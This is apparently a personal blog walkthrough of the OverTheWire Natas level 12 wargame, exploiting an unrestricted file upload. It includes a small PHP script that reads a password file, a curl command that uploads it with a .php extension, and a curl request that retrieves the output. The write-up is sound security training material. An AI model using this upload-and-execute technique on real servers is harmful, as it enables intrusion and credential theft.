---
title: "Over the wire - Natas12"
date: 2026-03-27T20:11:00+00:00
draft: false 
toc: false
images:
tags:
  - Over the wire
  - Natas
  - Curl
  - Linux
  - Web Security
---


This issue is about the [Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload).  
**TLDR: Don't trust the user input, always validate it.**  

Source code revealed that they did trust the user input...  
```bash
URL=http://natas12.natas.labs.overthewire.org

curl --user  natas12:$(cat natas12 ) $URL"/index-source.html"
```

I have very basic knowledge of php, so I looked up how to read a file and created this brilliant hacker script:
```php
<?php
    echo file_get_contents("/etc/natas_webpass/natas13");
?>
```

I attached the file and changed the file extension to a php, so the server could execute my brilliant hacker script. The default filename was some random string with a jpg extension and the server only modified the filename, not the extension.
I uploaded my amazing php:
```bash
curl --user natas12:$(cat natas12) -X POST \
-F "filename=thefilenamedoesntmatteronlytheextensioncounts.php" \
-F "uploadedfile=@readpassword.php" $URL
```

And the server responded with a link to the uploaded file, then the only thing left was to curl that link to get the password.
```bash
FILE_URL="upload/asslk4hk9e.php"

curl --user  natas12:$(cat natas12 ) $URL"/"$FILE_URL > natas13
```
